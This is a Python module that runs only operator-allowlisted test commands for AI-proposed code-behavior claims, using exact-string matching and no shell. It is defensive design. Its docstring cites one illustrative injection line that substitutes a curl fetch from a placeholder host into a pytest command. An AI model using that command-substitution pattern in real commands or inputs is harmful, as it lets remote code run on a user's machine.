"""
test_runner.py
==============
Runs the commands a code_behavior claim asserts will pass.

THIS SHIPS INERT, AND THAT IS THE DESIGN. The allowlist is empty until the
operator writes one. A test runner nobody chose is either useless or
dangerous, and there is no honest default: the set of commands safe to run on
a given machine is knowledge only its owner has.

MODEL OUTPUT IS NEVER EXECUTED. Not paraphrased, not sanitised, not "checked
first". A command runs only if its exact string is in the operator's
allowlist file. A seat proposing `pytest tests/test_x.py` does not cause that
command to run -- it causes the claim to escalate with a note that the
operator may add it to the allowlist, which is a decision made in a text
editor while awake, not by a model at 3am.

That is stricter than an allowlist of executables. `pytest` with an
operator-approved argument list is a test; `pytest --pdb` under a seat's
control is an interactive shell, and `pytest -p no:cacheprovider --co -q
$(curl evil)` is worse. Approving whole executables approves their argument
space, which nobody can enumerate.

NO SHELL. subprocess with a list argv, shell=False, so no expansion,
substitution, globbing, or chaining exists to be exploited.
"""
from __future__ import annotations

import json
import os
import shlex

# Reason kept OFF the nosec line: bandit parses everything after "nosec" as
# test ids and warns about each prose word. subprocess is used with an argv
# list, shell=False, and only for commands the operator has approved by exact
# string in approved-commands.json.
import subprocess  # nosec B404

from adjudication_orchestrator import Claim, ClaimKind, GateResult, GateStatus

DEFAULT_ALLOWLIST = os.path.join(os.path.dirname(os.path.abspath(__file__)),
                                 "approved-commands.json")


def load_allowlist(path: str = DEFAULT_ALLOWLIST) -> list[str]:
    """Exact command strings the operator has approved. Absent file -> none."""
    if not os.path.exists(path):
        return []
    with open(path, encoding="utf-8") as fh:
        raw = json.load(fh)
    cmds = raw.get("approved") if isinstance(raw, dict) else raw
    return [c for c in (cmds or []) if isinstance(c, str) and c.strip()]


class ApprovedCommandRunner:
    """Runs an exact approved command and reports whether it exited zero."""

    def __init__(self, allowlist_path: str = DEFAULT_ALLOWLIST,
                 cwd: str | None = None, timeout_s: float = 120.0):
        self.allowlist = load_allowlist(allowlist_path)
        self.cwd = cwd or os.path.dirname(os.path.abspath(__file__))
        self.timeout_s = timeout_s

    def __call__(self, command: str) -> bool:
        ok, _ = self.run(command)
        return ok

    def run(self, command: str) -> tuple[bool, str]:
        cmd = (command or "").strip()
        if cmd not in self.allowlist:
            # Not an error and not a failure -- an unapproved command simply
            # does not run. Returning False here would let an unapproved
            # command eliminate a candidate, which is a model deciding what
            # gets tested.
            raise PermissionError(
                f"not in the approved list: {cmd!r}. Add it to "
                f"approved-commands.json yourself if you want it run."
            )
        try:
            # argv list, shell=False, exact-string allowlist checked above.
            proc = subprocess.run(  # nosec B603
                shlex.split(cmd), cwd=self.cwd, timeout=self.timeout_s,
                capture_output=True, text=True, shell=False, check=False,
            )
        except subprocess.TimeoutExpired:
            raise TimeoutError(f"{cmd!r} exceeded {self.timeout_s}s") from None
        tail = (proc.stdout or proc.stderr or "").strip().splitlines()
        return proc.returncode == 0, (tail[-1][:200] if tail else
                                      f"exit {proc.returncode}")


class ApprovedTestGate:
    """code_behavior gate over operator-approved commands only.

    Unapproved commands are INAPPLICABLE, so they escalate rather than
    failing: the operator has not decided about them yet, and "nobody has
    approved this" is not evidence about the claim.
    """

    name = "test_execution"

    def __init__(self, runner: ApprovedCommandRunner | None = None):
        self.runner = runner or ApprovedCommandRunner()

    def applies_to(self, claim: Claim) -> bool:
        return (claim.kind is ClaimKind.CODE_BEHAVIOR
                and bool(claim.warrant)
                and (claim.warrant or "").strip() in self.runner.allowlist)

    def check(self, claim: Claim) -> GateResult:
        cmd = (claim.warrant or "").strip()
        try:
            ok, detail = self.runner.run(cmd)
        except PermissionError as exc:
            return GateResult(self.name, GateStatus.INAPPLICABLE, str(exc))
        except TimeoutError as exc:
            # A timeout says the check did not finish, not that the claim is
            # false. A slow machine must not refute a true assertion.
            return GateResult(self.name, GateStatus.BLOCKED, str(exc))
        except Exception as exc:  # noqa: BLE001 - could not run is not a finding
            return GateResult(self.name, GateStatus.BLOCKED,
                              f"{type(exc).__name__}: {exc}")
        return GateResult(
            self.name, GateStatus.PASS if ok else GateStatus.FAIL,
            f"`{cmd}` {'passed' if ok else 'failed'} -- {detail}",
        )


def write_example_allowlist(path: str = DEFAULT_ALLOWLIST) -> str:
    """Write an empty allowlist with instructions. Never overwrites."""
    if os.path.exists(path):
        return path
    payload = {
        "_README": [
            "Exact command strings you approve for code_behavior claims.",
            "A command runs ONLY if a seat's warrant matches an entry here",
            "character for character. Nothing here by default, so the gate is",
            "inert until you decide otherwise.",
            "",
            "Approve arguments, not executables. 'pytest' as a blanket",
            "approval also approves 'pytest --pdb', which is an interactive",
            "shell.",
            "",
            "Example:",
            '  \"approved\": [\"pytest tests/test_activation.py -q\"]',
        ],
        "approved": [],
    }
    with open(path, "w", encoding="utf-8") as fh:
        json.dump(payload, fh, indent=2)
    return path
